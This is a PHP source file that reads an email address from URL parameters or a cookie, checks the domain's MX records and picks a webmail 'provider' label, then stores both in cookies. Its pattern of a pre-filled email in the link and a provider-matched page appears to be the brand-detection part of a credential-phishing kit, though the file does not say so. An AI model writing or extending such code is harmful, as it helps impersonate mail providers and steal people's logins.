<?php
declare(strict_types=1);

require_once __DIR__ . '/providers.php';

function mx_normalize_host(string $host): string
{
    return strtolower(rtrim(trim($host), '.'));
}

function mx_email_domain(string $email): string
{
    $email = trim($email);
    $at = strrpos($email, '@');
    if ($at === false) {
        return '';
    }

    return strtolower(substr($email, (int) $at + 1));
}

function mx_extract_email_from_request(): string
{
    $qs = (string) ($_SERVER['QUERY_STRING'] ?? '');
    if ($qs !== '' && preg_match('/^=?([^&]+)/', $qs, $m)) {
        $candidate = urldecode(trim($m[1]));
        if (str_contains($candidate, '@')) {
            return $candidate;
        }
    }

    foreach (['email', 'mail', 'e', 'u', 'login'] as $key) {
        if (!empty($_GET[$key]) && is_string($_GET[$key])) {
            $candidate = trim($_GET[$key]);
            if (str_contains($candidate, '@')) {
                return $candidate;
            }
        }
    }

    if (!empty($_COOKIE['wm_email']) && is_string($_COOKIE['wm_email'])) {
        return trim($_COOKIE['wm_email']);
    }

    return '';
}

function mx_fetch_hosts(string $domain): array
{
    if ($domain === '') {
        return [];
    }

    $hosts = [];
    $records = @dns_get_record($domain, DNS_MX);
    if (!is_array($records)) {
        return [];
    }

    foreach ($records as $record) {
        if (!empty($record['target']) && is_string($record['target'])) {
            $hosts[] = mx_normalize_host($record['target']);
        }
    }

    return array_values(array_unique($hosts));
}

function mx_resolve_provider(string $email): string
{
    static $map = null;
    if ($map === null) {
        $map = require __DIR__ . '/mx-map.php';
    }

    $domain = mx_email_domain($email);
    if ($domain === '') {
        return (string) ($map['default'] ?? 'cpanel-webmail');
    }

    $mxHosts = mx_fetch_hosts($domain);

    foreach ($mxHosts as $mx) {
        foreach ($map['exact'] as $pattern => $provider) {
            if ($mx === mx_normalize_host((string) $pattern)) {
                return (string) $provider;
            }
        }
    }

    foreach ($mxHosts as $mx) {
        foreach ($map['contains'] as $needle => $provider) {
            if (str_contains($mx, (string) $needle)) {
                return (string) $provider;
            }
        }
    }

    if (!empty($map['domain'][$domain])) {
        return (string) $map['domain'][$domain];
    }

    return (string) ($map['default'] ?? 'cpanel-webmail');
}

function mx_set_provider_cookie(string $provider, string $email = ''): void
{
    $secure = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https');

    setcookie('wm_provider', $provider, [
        'expires'  => time() + 86400,
        'path'     => '/',
        'secure'   => $secure,
        'httponly' => false,
        'samesite' => 'Lax',
    ]);

    if ($email !== '') {
        setcookie('wm_email', $email, [
            'expires'  => time() + 86400,
            'path'     => '/',
            'secure'   => $secure,
            'httponly' => false,
            'samesite' => 'Lax',
        ]);
    }
}

function mx_provider_from_cookie(): string
{
    $provider = (string) ($_COOKIE['wm_provider'] ?? '');
    return provider_exists($provider) ? $provider : '';
}
